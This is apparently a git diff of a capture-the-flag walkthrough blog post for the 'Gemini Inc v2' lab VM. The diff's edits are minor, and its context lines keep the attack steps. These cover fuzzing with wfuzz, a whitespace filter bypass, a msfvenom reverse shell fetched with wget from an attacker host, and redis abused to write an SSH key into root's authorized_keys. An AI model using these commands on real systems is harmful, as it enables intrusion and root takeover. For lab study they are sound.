@@ -1,7 +1,7 @@
 ---
 layout: post
 date: 2018-06-03 17:25:02 +0000
-modified: 2018-06-07 16:37:51 +0000
+modified: 2018-06-08 22:39:48 +0000
 title: "Gemini Inc: v2 Walkthrough"
 category: Walkthrough
 tag: "Gemini Inc"
@@ -50,7 +50,7 @@ PORT   STATE SERVICE REASON         VERSION
 
 ### Directory/File Enumeration
 
-Since the site is more secure now, let's take a different approach this time &mdash; fuzzing. The tool for such a job is `wfuzz`. It's fast, comes with high quality wordlists, and easy-to-use filters for response code, the number of lines, words, and even characters.
+Since the site is more secure now, let's take a different approach this time &mdash; fuzzing. The tool for such a job is `wfuzz`. It's fast, comes with high quality wordlists, and easy-to-use filters for response code, number of lines, words, and even characters.
 
 ```
 # wfuzz -w /usr/share/wfuzz/wordlist/general/megabeast.txt -w /usr/share/wfuzz/wordlist/general/extensions_common.txt --hc 404 -t 50 http://192.168.10.130/FUZZFUZ2Z
@@ -102,7 +102,7 @@ We'll need the user ID to activate the account. Although the account is not acti
 
 ![0.2u9hulbd8mh](/assets/images/posts/geminiinc-v2-walkthrough/0.2u9hulbd8mh.png)
 
-You can change the user ID in the URL, and because the title gave their usernames away, you can determine the username and user ID of all the users from here.
+You can change the user ID in the URL, and because the page's title gave their usernames away, you can determine the username and user ID of all the users from here.
 
 ```
 Gemini   (u=1)
@@ -239,7 +239,7 @@ Recall the file `blacklist.txt` uncovered during fuzzing? It had a test for ille
 
 The most common shell in Linux distributions is `bash` and it uses whitespace as the separator for command execution. For example, in this command `wget -O /tmp/rev 192.168.10.128/rev`, the space character is the separator. In fact, `bash` defines space, tab, and the newline character as whitespace. In other words, we can substitute space with tab in the previous command and it should execute.
 
-With this in mind, let's generate a reverse shell with `msfvenom` and name it as `rev`; host it with Python's `SimpleHTTPServer`, and execute `wget` in the **Execute Command** page to copy it over. The aim would be to execute the reverse shell in the **Execute Command** page.
+With this in mind, let's generate a reverse shell with `msfvenom` and name it as `rev`; host it with Python's `SimpleHTTPServer`, and execute `wget` in the **Execute Command** page to copy it over. The aim is to execute the reverse shell in the **Execute Command** page.
 
 ```
 # msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.10.128 LPORT=4444 -f elf -o rev
@@ -271,7 +271,7 @@ During enumeration of `gemini1`'s account, I discover `redis` is running on the 
 
 ![0.uz31kpsrd4](/assets/images/posts/geminiinc-v2-walkthrough/0.uz31kpsrd4.png)
 
-I need a password to log in to the `redis` server and it's conveniently located in `/etc/redis/6379.conf`.
+The password to log in to the `redis` server is conveniently located in `/etc/redis/6379.conf`.
 
 ![0.bty888qayjj](/assets/images/posts/geminiinc-v2-walkthrough/0.bty888qayjj.png)
 
@@ -287,13 +287,13 @@ Here's how.
 6. Save the configuration.
 7. Log in with the RSA private key and enjoy your `root` shell.
 
-_Step 1: Generate a SSH keypair with `ssh-keygen`._
+***Step 1: Generate a SSH keypair with `ssh-keygen`.***
 
 ```
 $ ssh-keygen -t rsa -b 2048
 ```
 
-_Step 2: Copy `id_rsa.pub` to `~/.ssh/public.txt`. Pad the top and bottom with two newlines._
+***Step 2: Copy `id_rsa.pub` to `~/.ssh/public.txt`. Pad the top and bottom with two newlines.***
 
 ```
 $ echo -e "\n\n" > .ssh/public.txt
@@ -301,31 +301,31 @@ $ cat .ssh/id_rsa.pub >> .ssh/public.txt
 $ echo -e "\n\n" >> .ssh/public.txt
 ```
 
-_Step 3: Set `~/.ssh/public.txt` as a new `redis` value._
+***Step 3: Set `~/.ssh/public.txt` as a new `redis` value.***
 
 ```
 cat .ssh/public.txt | redis-cli -h 127.0.0.1 -a 8a7b86a2cd89d96dfcc125ebcc0535e6 -x set pub
 ```
 
-_Step 4: Configure `dir` as `/root/.ssh/`._
+***Step 4: Configure `dir` as `/root/.ssh/`.***
 
 ```
 $ redis-cli -h 127.0.0.1 -a 8a7b86a2cd89d96dfcc125ebcc0535e6 config set dir "/root/.ssh/"
 ```
 
-_Step 5: Configure `dbfilename` as `authorized_keys`._
+***Step 5: Configure `dbfilename` as `authorized_keys`.***
 
 ```
 redis-cli -h 127.0.0.1 -a 8a7b86a2cd89d96dfcc125ebcc0535e6 config set dbfilename authorized_keys
 ```
 
-_Step 6: Save the configuration._
+***Step 6: Save the configuration.***
 
 ```
 redis-cli -h 127.0.0.1 -a 8a7b86a2cd89d96dfcc125ebcc0535e6 save
 ```
 
-_Step 7: Log in with the RSA private key and enjoy your `root` shell._
+***Step 7: Log in with the RSA private key and enjoy your `root` shell.***
 
 ![0.bwzw8a9z1nd](/assets/images/posts/geminiinc-v2-walkthrough/0.bwzw8a9z1nd.png)
 
